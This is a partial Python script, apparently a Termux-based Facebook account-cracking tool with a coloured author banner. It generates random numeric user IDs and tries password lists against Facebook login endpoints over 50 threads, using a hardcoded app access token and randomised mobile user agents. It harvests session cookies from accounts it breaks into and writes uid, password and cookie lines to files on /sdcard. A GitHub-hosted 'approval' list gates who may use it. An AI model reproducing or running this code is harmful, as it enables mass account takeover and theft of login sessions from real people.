...
|  $$$$$$/         \  $/    /$$$$$$|  $$$$$$/| $$  | $$| $$$$$$$$
 ...
 \033[1;95m
 \033[1;92m-------------------------------------------------------
\033[1;32m•\033[1;37m CREATED BY  \033[1;32m •|✓\033[1;37m  MR JAMIL VISAL.
\033[1;32m•\033[1;37m FACEBOOK    \033[1;32m •|✓\033[1;37m  MR HAJi Shahino.
\033[1;32m•\033[1;37m FRIENDS     \033[1;32m •|✓\033[1;37m  SAHEN😘ATAL😍POPAL🥳.      
\033[1;32m•\033[1;37m TOOLS       \033[1;32m •|✓\033[1;37m  FREE.     
\033[1;32m•\033[1;37m VERSION     \033[1;32m •|✓\033[1;37m  \033[1;32m5.7\033[1;37m       
 \033[1;92m-------------------------------------------------------"""
def line():
	print(f'\033[1;32m-----------------------------------------------')
...
def afg():
                ...
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=50) as S1N:     
                        clear()
...
def api1(ids,names,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mjamil\x1b[1;92m-\x1b[1;92mM1\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				uid = str(po['uid'])
				print('\r\r\033[1;32m [JAMIL-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				cookies = f"sb={ssbb};{ckkk}"
				print('\033[1;32m [🥀] Cookies :- '+cookies)
				open('/sdcard/JAMIL-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
				oks.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;33m [jamil-CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/HAQANI-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
...
def rd(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;32m [\x1b[1;92mjamil\x1b[1;92m-\x1b[1;92m\x1b[1;92m] %s|\033[1;32mOK|%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()		
		for pas in passlist:                                          
			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
			ua = 'Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(redmi))} Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"'
			...
			if 'session_key' in po:
				...
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;31m [jamil-CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/jamil-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
...
def approval():
  ...
  try:
    httpCaht = requests.get('https://github.com/HAQANI430/SERAJOO/blob/main/Haqani_approval').text
    if id in httpCaht:
